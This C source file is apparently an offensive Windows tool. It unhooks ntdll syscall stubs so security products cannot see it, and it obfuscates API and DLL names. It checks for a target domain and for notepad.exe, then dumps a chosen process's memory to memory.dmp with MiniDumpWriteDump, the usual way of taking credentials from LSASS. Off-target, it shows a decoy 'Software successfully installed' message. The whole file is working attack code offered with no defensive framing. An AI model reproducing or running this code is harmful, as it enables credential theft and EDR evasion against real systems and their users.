#define SECURITY_WIN32

#include <Windows.h>
#include <security.h>
#include <tlhelp32.h>
#include <stdio.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");
    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");
    FARPROC NtReadVirtualMemory = GetProcAddress(hDll, "NtReadVirtualMemory");

    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs
    PatchHook(NtReadVirtualMemory, 0x3f, 0x00);

    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR* patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

VOID ResolveString(DWORD *chars, DWORD dwSize, CHAR **output) {
    char charset[] = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-";
    *output = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    int i = 0;
    for(i = 0; i < dwSize; i++) {
        sprintf(*output, "%s%c", *output, charset[chars[i]]);
    }
}

DWORD CheckProcess(CHAR *process) {
    PROCESSENTRY32 pe32;
    DWORD dwReturn = FALSE;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, process) == 0) {
                dwReturn = TRUE;
                break;
            }
        } while(Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return dwReturn;
}

DWORD CheckDomain(CHAR *domain) {
    CHAR username[256];
    CHAR *slash = NULL;
    DWORD dwSize = 255;
    memset(username, 0x00, 256);
    GetUserNameEx(NameSamCompatible, username, &dwSize);

    slash = strstr(username, "\\");
    username[slash - username] = 0x00;
    printf("Looking for %s\nGot %s\n", domain, username);
    if(strcmp(username, domain) == 0) {
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char **argv) {
    DWORD dom[] = {39,40,54,46,55,50,51,63,48,7,44,57,52,9,49};
    DWORD dbg[] = {39,11,16,17,14,21,25,62,13,21,21};
    DWORD mini[] = {48,18,23,18,39,30,22,25,58,27,18,29,14,39,30,22,25};

    CHAR *MiniDumpWriteDumpName = NULL;
    CHAR *DbghelpDllName = NULL;
    CHAR *domainName = NULL;
    ResolveString(dom, 15, &domainName);

    if(CheckDomain(domainName)) {
        CleanUp();
        if(CheckProcess("notepad.exe")) {
            ResolveString(dbg, 11, &DbghelpDllName);
            ResolveString(mini, 17, &MiniDumpWriteDumpName);

            DWORD PID = atoi(argv[1]);
            HANDLE hProc = NULL;
            HANDLE hFile = NULL;
            BOOL bSuccess = FALSE;
            BOOL(*MiniDumpWriteDump)(HANDLE, DWORD, HANDLE, DWORD, VOID*, VOID*, VOID*);

            MiniDumpWriteDump = (FARPROC)GetProcAddress(LoadLibrary(DbghelpDllName), MiniDumpWriteDumpName);
            printf("MiniDumpWriteDump found at 0x%p\n", MiniDumpWriteDump);

            if(MiniDumpWriteDump == NULL) {
                printf("Can't resolve MiniDumpWriteDump. Exiting (%ld)\n", GetLastError());
                ExitProcess(0);
            }

            printf("Trying to dump PID: %d\n", PID);
            hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
            printf("Process HANDLE 0x%p\n", hProc);

            if(hProc == NULL) {
                printf("HANDLE is NULL. Exiting (%ld)\n", GetLastError());
                ExitProcess(0);
            }

            hFile = CreateFile("memory.dmp", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            printf("memory.dmp HANDLE 0x%p\n", hFile);

            if(hFile == INVALID_HANDLE_VALUE) {
                printf("Can't create memory.dmp. Exiting (%ld)\n", GetLastError());
                CloseHandle(hProc);
                ExitProcess(0);
            }

            bSuccess = MiniDumpWriteDump(hProc, PID, hFile, 2, NULL, NULL, NULL);
            printf("Process Completed (%d)(%ld)", (DWORD)bSuccess, GetLastError());

            CloseHandle(hProc);
            CloseHandle(hFile);
        } else {
            printf("notepad.exe not found\n");
        }
    } else {
        printf("Software successfully installed.\n");
    }
    return 0;
}

